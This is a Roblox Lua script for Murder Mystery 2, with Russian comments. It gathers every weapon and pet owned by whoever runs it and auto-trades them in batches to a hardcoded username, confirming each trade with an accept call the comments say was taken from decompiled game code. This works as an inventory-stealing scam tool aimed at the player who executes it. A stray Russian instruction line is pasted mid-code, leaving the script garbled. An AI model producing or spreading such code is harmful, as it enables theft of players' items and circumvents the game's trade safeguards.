-- 🎁 MM2 AUTO MASS TRADE (WITH PROPER CONFIRM)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Trade = ReplicatedStorage:WaitForChild("Trade", 30)
local Players = game:GetService("Players")

if not Trade then 
    warn("[ERROR] Trade not found")
    return 
end

local SendRequest  = Trade:WaitForChild("SendRequest")
local StartTrade   = Trade:WaitForChild("StartTrade")
local UpdateTrade  = Trade:WaitForChild("UpdateTrade")
local OfferItem    = Trade:WaitForChild("OfferItem")
local AcceptTrade  = Trade:WaitForChild("AcceptTrade")
local DeclineTrade = Trade:WaitForChild("DeclineTrade")

local TARGET_NAME = "artemka1223457"
local MAX_UNIQUE = 4

local profileData = nil
local currentLastOffer = nil
local itemsGiven = {}
local tradeStartTime = 0
local cooldownActive = false

print("[INFO] Loading ProfileData...")

local success = pcall(function()
    profileData = require(ReplicatedStorage.Modules:WaitForChild("ProfileData"))
end)

if not success or not profileData then
    warn("[ERROR] Failed to load ProfileData") 
    return 
end

print("[OK] ProfileData loaded")

-- Получение доступных предметов
local function getAvailableItems()
    local items = {}
    
    if profileData.Weapons and profileData.Weapons.Owned then
        for name, amount in pairs(profileData.Weapons.Owned) do
            if name ~= "DefaultKnife" and name ~= "DefaultGun" then
                local given = itemsGiven[name] or 0
                local left = amount - given
                if left > 0 then
                    table.insert(items, {name = name, type = "Weapons", left = left})
                end
            end
        end
    end
    
    if profileData.Pets and profileData.Pets.Owned then
        for name, amount in pairs(profileData.Pets.Owned) do
            local given = itemsGiven[name] or 0
            local left = amount - given
            if left > 0 then
                table.insert(items, {name = name, type = "Pets", left = left})
            end
        end
    end
    
    return items
end

-- Отслеживание LastOffer и кулдауна
UpdateTrade.OnClientEvent:Connect(function(data)
    if data and data.LastOffer then 
        currentLastOffer = data.LastOffer 
    end
end)

-- Основная функция трейда
local function runTradeCycle()
    local available = getAvailableItems()
    
    if #available == 0 then
        print("\n[SUCCESS] ALL ITEMS TRADED!")
        return false
    end

    local batch = {}
    local maxItems = math.min(MAX_UNIQUE, #available)
    
    for i = 1, maxItems do
        table.insert(batch, available[i])
    end

    print("\n[INFO] New trade - Items: " .. #batch)
    
    for i, it in ipairs(batch) do
        print("   " .. i .. ". " .. it.name .. " x" .. it.left)
    end

    local target = Players:FindFirstChild(TARGET_NAME)
    if not target then 
        warn("[ERROR] Player not found: " .. TARGET_NAME)
        return true 
    end

    -- Отправка запроса
    local reqOk = pcall(function() 
        return SendRequest:InvokeServer(target) 
    end)
    
    if not reqOk then 
        warn("[ERROR] Request failed")
        return true 
    end

    -- Ждём StartTrade
    local started = false
    local sc
    sc = StartTrade.OnClientEvent:Connect(function(_, pName)
        if pName == TARGET_NAME then 
            started = true 
            if sc then sc:Disconnect() sc = nil end
        end
    end)
    
    local t0 = tick()
    while not started and tick() - t0 < 10 do 
        task.wait(0.5) 
    end
    
    if not started then 
        warn("[ERROR] Trade did not open")
        if sc then sc:Disconnect() sc = nil end
        return true 
    end

    currentLastOffer = nil
    tradeStartTime = 0
    cooldownActive = true
    
    print("[INFO] Trade opened. Offering items...")

    -- Выкладываем предметы
    for _, it in ipairs(batch) do
        for i = 1, it.left do
            local ok = pcall(function() 
                OfferItem:FireServer(it.name, it.type) 
            end)
            
            if ok then
                itemsGiven[it.name] = (itemsGiven[it.name] or 0) + 1
                print("   [OK] " .. it.name .. " (" .. i .. "/" .. it.left .. ")")
            end
            
            task.wait(0.25)
        end
    end
сделай без req
    -- Ждём кулдаун (6 секунд из декомпиляции)
    print("[INFO] Waiting 6s cooldown...")
    task.wait(6)
    cooldownActive = false
    
    -- Ждём LastOffer если ещё не получен
    if not currentLastOffer then
        print("[INFO] Waiting for LastOffer...")
        local t1 = tick()
        while not currentLastOffer and tick() - t1 < 5 do
            task.wait(0.5)
        end
    end

    if currentLastOffer then
        -- ВАЖНО: Сначала ждём 0.5 сек (как в оригинале 0.4)
        print("[INFO] Waiting 0.5s before confirm...")
        task.wait(0.5)
        
        print("[INFO] Confirming trade...")
        local confirmOk = pcall(function()
            -- Точная сигнатура из декомпиляции
            AcceptTrade:FireServer(game.PlaceId * 3, currentLastOffer)
        end)
        
        if not confirmOk then
            warn("[ERROR] Confirm failed")
        end
    else
        warn("[WARN] No LastOffer received")
    end

    -- Ждём завершения
    local done = false
    local ac
    ac = AcceptTrade.OnClientEvent:Connect(function() 
        done = true 
        if ac then ac:Disconnect() ac = nil end
    end)
    
    local t2 = tick()
    while not done and tick() - t2 < 15 do 
        task.wait(0.5) 
    end
    
    if ac then ac:Disconnect() ac = nil end

    print("[INFO] Trade completed. Waiting 6s...")
    task.wait(6)
    
    return true
end

-- Запуск
print("\n[START] AUTO-TRADE SYSTEM")
print("[TARGET] " .. TARGET_NAME)

while runTradeCycle() do end

print("[DONE] Finished")
